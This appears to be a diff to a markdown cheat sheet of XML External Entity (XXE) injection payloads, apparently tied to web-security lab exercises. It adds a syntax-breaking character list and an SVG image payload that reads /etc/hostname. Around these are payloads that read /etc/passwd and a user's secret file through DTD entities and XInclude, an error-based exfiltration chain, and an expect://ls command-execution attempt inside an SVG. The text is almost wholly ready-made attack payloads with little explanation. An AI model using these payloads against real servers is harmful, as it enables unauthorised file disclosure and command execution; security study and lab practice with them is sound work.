@@ -38,6 +38,14 @@
 <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "file:///etc/passwd" > %xxe; ]> 
 
 productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1 
+
+# break sintax with
+<
+>
+&
+'
+"
+`
 ```
 
 #### XXE-OOB internal entity (external entities not allowed)
@@ -74,7 +82,8 @@ productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="tex
 
 # EXFILTRATE DATA VIA ERROR
 <!ENTITY % file SYSTEM "file:///home/carlos/secret">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///ERROR/%file;' >">
+<!ENTITY %
+ eval "<!ENTITY &#x25; exfil SYSTEM 'file:///ERROR/%file;' >">
 %eval;
 %exfil;
 ```
@@ -83,12 +92,23 @@ productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="tex
 <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
     <image xlink:href="expect://ls" width="200" height="200"></image>
 </svg>
-
 ```
 ```bash
 <foo xmlns:xi="http://www.w3.org/2001/XInclude">
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
+
+#### INSIDE IMAGE SVG
+
+```bash
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
+   <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+```
+
+
 #### XXE-DTD-LOCAL
 > /usr/share/yelp/dtd/docbookx.dtd is a local DTD found in > GNOME environments
 > Important: represent certain characters in hexadecimal`
